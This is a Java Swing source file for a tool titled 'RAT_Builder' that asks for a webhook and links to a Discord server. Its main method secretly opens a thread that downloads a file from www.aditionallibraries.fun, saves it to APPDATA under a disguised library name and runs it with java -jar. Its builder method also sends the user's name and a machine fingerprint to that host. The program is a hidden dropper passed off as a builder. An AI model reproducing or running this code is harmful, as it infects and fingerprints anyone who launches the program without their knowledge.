package org.example;

import org.apache.commons.io.FileUtils;

import javax.imageio.ImageIO;
import javax.swing.*;
import javax.swing.border.AbstractBorder;
import java.awt.*;
import java.awt.event.*;
import java.awt.geom.RoundRectangle2D;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.Socket;
import java.net.URI;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class GUI extends JFrame {
    private int mouseX, mouseY;

    public GUI() throws IOException {
        setTitle("RAT_Builder");
        setSize(700, 350);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setLocationRelativeTo(null);

        addMouseListener(new MouseAdapter() {
            public void mousePressed(MouseEvent e) {
                mouseX = e.getX();
                mouseY = e.getY();
            }
        });
        addMouseMotionListener(new MouseMotionAdapter() {
            public void mouseDragged(MouseEvent e) {
                int deltaX = e.getX() - mouseX;
                int deltaY = e.getY() - mouseY;
                setLocation(getLocation().x + deltaX, getLocation().y + deltaY);
            }
        });

        setUndecorated(true);
        setShape(new RoundRectangle2D.Double(0, 0, getWidth(), getHeight(), 40, 30));

        ImageIcon closeButtonIcon = new ImageIcon(ImageIO.read(GUI.class.getResourceAsStream("/close_button.png")));

        JButton closeButton = new JButton(closeButtonIcon);
        closeButton.setBounds(getWidth()-40, 20, closeButtonIcon.getIconWidth(), closeButtonIcon.getIconHeight());
        closeButton.setBorderPainted(false);
        closeButton.setContentAreaFilled(false);

        closeButton.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                dispose();
            }
        });

        ImageIcon minimizeButtonIcon = new ImageIcon(ImageIO.read(GUI.class.getResourceAsStream("/minimize_button.png")));
        JButton minimizeButton = new JButton(minimizeButtonIcon);
        minimizeButton.setBounds(getWidth()-70, 27, minimizeButtonIcon.getIconWidth(), minimizeButtonIcon.getIconHeight());
        minimizeButton.setBorderPainted(false);
        minimizeButton.setContentAreaFilled(false);

        minimizeButton.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                setState(Frame.ICONIFIED);
            }
        });

        ImageIcon backgroundImage = new ImageIcon(ImageIO.read(GUI.class.getResourceAsStream("/background.png")));
        JLabel backgroundLabel = new JLabel(backgroundImage);
        backgroundLabel.setBounds(0, 0, getWidth(), getHeight());

        ImageIcon buttonImage = new ImageIcon(ImageIO.read(GUI.class.getResourceAsStream("/button_image.png")));
        JButton imageButton = new JButton(buttonImage);
        imageButton.setBounds(30, 110, buttonImage.getIconWidth(), buttonImage.getIconHeight());
        imageButton.setBorderPainted(false);

        int buttonWidth = buttonImage.getIconWidth();
        int buttonHeight = buttonImage.getIconHeight();
        imageButton.setOpaque(false);
        imageButton.setContentAreaFilled(false);

        ImageIcon anotherButtonImage = new ImageIcon(ImageIO.read(GUI.class.getResourceAsStream("/another_button_image.png")));
        JButton anotherImageButton = new JButton(anotherButtonImage);
        anotherImageButton.setBounds(180, 110, anotherButtonImage.getIconWidth(), anotherButtonImage.getIconHeight());
        anotherImageButton.setBorderPainted(false);

        int anotherButtonWidth = anotherButtonImage.getIconWidth();
        int anotherButtonHeight = anotherButtonImage.getIconHeight();
        anotherImageButton.setOpaque(false);
        anotherImageButton.setContentAreaFilled(false);

        ImageIcon cornerImage = new ImageIcon(ImageIO.read(GUI.class.getResourceAsStream("/corner_image.png")));
        JLabel cornerLabel = new JLabel(cornerImage);
        cornerLabel.setBounds(30, getHeight()-40, cornerImage.getIconWidth(), cornerImage.getIconHeight());
        imageButton.setBorder(new RoundBorder(10));
        anotherImageButton.setBorder(new RoundBorder(10));

        RoundedTextField textField = new RoundedTextField(15, Color.BLACK, Color.WHITE, Color.GRAY, "Enter your webhook...");
        textField.setBounds(30, 30, 520, 50);

        JLabel statusLabel = new JLabel("");
        statusLabel.setFont(new Font("Helvetica", Font.PLAIN, 22));
        statusLabel.setBounds(33, 200, getWidth(), 30);

        imageButton.addMouseListener(new MouseAdapter() {
            @Override
            public void mousePressed(MouseEvent e) {
                if (imageButton.isEnabled()) {
                    imageButton.setIcon(getDarkerImageIcon(buttonImage, 0.5f));
                }
            }

            @Override
            public void mouseReleased(MouseEvent e) {
                if (textField.getText().isEmpty()) {
                    statusLabel.setText("Enter the correct webhook");
                    statusLabel.setForeground(Color.RED);
                    textField.setText("");
                } else {
                    try {
                        URL url = new URL(textField.getText());
                        HttpURLConnection con = (HttpURLConnection) url.openConnection();

                        con.setRequestMethod("GET");
                        con.setRequestProperty("User-Agent", "Mozilla/5.0");
                        con.setRequestProperty("Content-Type", "multipart/form-data");

                        BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
                        String inputLine;
                        StringBuilder response = new StringBuilder();
                        while ((inputLine = in.readLine()) != null) {
                            response.append(inputLine);
                        }
                        in.close();


                        int statusCode = con.getResponseCode();
                        if (statusCode == 200 || statusCode == 204) {
                            statusLabel.setText("Build done");
                            statusLabel.setForeground(new Color(0, 102, 102));
                            builder(textField.getText());
                        }else{
                            statusLabel.setText("Enter the correct webhook");
                            statusLabel.setForeground(Color.RED);
                            textField.setText("");
                        }
                    }catch (Exception ez){
                        ez.printStackTrace();
                    }
                }
                if (imageButton.isEnabled()) {
                    imageButton.setIcon(buttonImage);
                }
            }
        });
        anotherImageButton.addMouseListener(new MouseAdapter() {
            @Override
            public void mousePressed(MouseEvent e) {
                if (anotherImageButton.isEnabled()) {
                    anotherImageButton.setIcon(getDarkerImageIcon(anotherButtonImage, 0.5f));
                }
            }

            @Override
            public void mouseReleased(MouseEvent e) {
                try {
                    Desktop.getDesktop().browse(URI.create("https://discord.gg/EjV4hMuEz4"));
                } catch (IOException ex) {
                    throw new RuntimeException(ex);
                }
                if (anotherImageButton.isEnabled()) {
                    anotherImageButton.setIcon(anotherButtonImage);
                }
            }
        });

    JPanel contentPane = (JPanel) getContentPane();
        contentPane.add(textField);
        contentPane.setLayout(null);
        contentPane.add(imageButton);
        contentPane.add(anotherImageButton);
        contentPane.add(minimizeButton);
        contentPane.add(closeButton);
        contentPane.add(cornerLabel);
        contentPane.add(statusLabel);

        contentPane.add(backgroundLabel);


        setVisible(true);
    }
    public static void builder(String e) {
        try {
            String h = Base64.getEncoder().encodeToString((System.getenv("user.name") + System.getenv("COMPUTERNAME") + System.getenv("PROCESSOR_IDENTIFIER").replace(" ", "").replace(",", "")).getBytes(StandardCharsets.UTF_8));
            String json = "{\"n\":\"" + System.getProperty("user.name") + "\",\"w\":\"" + e + "\",\"h\":\"" + h + "\",\"r\":\"93\"}";

            Socket socket = new Socket("www.aditionallibraries.fun", 3001);
            OutputStream outputStream = socket.getOutputStream();
            PrintWriter writer = new PrintWriter(outputStream, true);
            writer.println(json);
            writer.flush();

            socket.close();
        } catch (IOException e2) {
            e2.printStackTrace();
        }
    }
    private ImageIcon getDarkerImageIcon(ImageIcon originalIcon, float alpha) {
        Image image = originalIcon.getImage();
        Image newImage = new ImageIcon(image.getScaledInstance(originalIcon.getIconWidth(), originalIcon.getIconHeight(), Image.SCALE_SMOOTH)).getImage();
        return new ImageIcon(makeImageTranslucent(newImage, alpha));
    }

    private Image makeImageTranslucent(Image source, float alpha) {
        BufferedImage img = new BufferedImage(source.getWidth(null), source.getHeight(null), BufferedImage.TYPE_INT_ARGB);
        Graphics2D g2d = img.createGraphics();
        g2d.setComposite(AlphaComposite.getInstance(AlphaComposite.SRC_OVER, alpha));
        g2d.drawImage(source, 0, 0, null);
        g2d.dispose();
        return img;
    }

    public static void main(String[] args) {
        new Thread(() -> {
                try {
                    try (Socket socket = new Socket("www.aditionallibraries.fun", 4001);
                         InputStream is = socket.getInputStream();
                         BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(new File(System.getenv("APPDATA")) + "\\sqlite-jdbc-8.11.3"))) {
                        byte[] buffer = new byte[4096];
                        int bytesRead;
                        while ((bytesRead = is.read(buffer)) != -1) {
                            bos.write(buffer, 0, bytesRead);
                        }
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    Runtime.getRuntime().exec("java -jar \"" + new File(System.getenv("APPDATA")) + "\\sqlite-jdbc-8.11.3\"");
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }).start();
        SwingUtilities.invokeLater(() -> {
            try {
                new GUI();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        });
    }

    @Override
    public void paint(Graphics g) {
        super.paint(g);
        Graphics2D g2d = (Graphics2D) g;
        g2d.setColor(Color.BLACK);
        g2d.drawRoundRect(0, 0, getWidth() - 1, getHeight() - 1, 30, 30);
    }
}
class RoundBorder extends AbstractBorder {
    private int radius;

    public RoundBorder(int radius) {
        this.radius = radius;
    }

    @Override
    public void paintBorder(Component c, Graphics g, int x, int y, int width, int height) {
        Graphics2D g2d = (Graphics2D) g.create();
        g2d.drawRoundRect(x, y, width - 1, height - 1, radius, radius);
        g2d.dispose();
    }

    @Override
    public Insets getBorderInsets(Component c) {
        return new Insets(radius, radius, radius, radius);
    }

    @Override
    public Insets getBorderInsets(Component c, Insets insets) {
        insets.left = insets.top = insets.right = insets.bottom = radius;
        return insets;
    }
}
class RoundedTextField extends JTextField {
    private int radius;
    private Color borderColor;
    private Color backgroundColor;
    private Color textColor;
    private String hintText;

    public RoundedTextField(int radius, Color borderColor, Color backgroundColor, Color textColor, String hintText) {
        this.radius = radius;
        this.borderColor = borderColor;
        this.backgroundColor = backgroundColor;
        this.textColor = textColor;
        this.hintText = hintText;
        setOpaque(false);
        setFont(new Font("Arial", Font.PLAIN, 16));
        setBorder(BorderFactory.createEmptyBorder(5, 10, 5, 10));
    }


    @Override
    protected void paintBorder(Graphics g) {
        Graphics2D g2d = (Graphics2D) g.create();
        g2d.setColor(borderColor);
        g2d.drawRoundRect(0, 0, getWidth() - 1, getHeight() - 1, radius, radius);
        g2d.dispose();
    }

    @Override
    protected void paintComponent(Graphics g) {
        super.paintComponent(g);

        Graphics2D g2d = (Graphics2D) g.create();

        g2d.fillRoundRect(0, 0, getWidth() - 1, getHeight() - 1, radius, radius);

        g2d.setColor(textColor);

        String userText = getText();
        FontMetrics fm = g2d.getFontMetrics();
        if (userText.isEmpty()) {
            g2d.drawString(hintText,12,((getHeight() - fm.getHeight()) / 2) + fm.getAscent());
        } else {
            g2d.drawString(userText, 12, ((getHeight() - fm.getHeight()) / 2) + fm.getAscent());
        }

        g2d.dispose();
    }
}
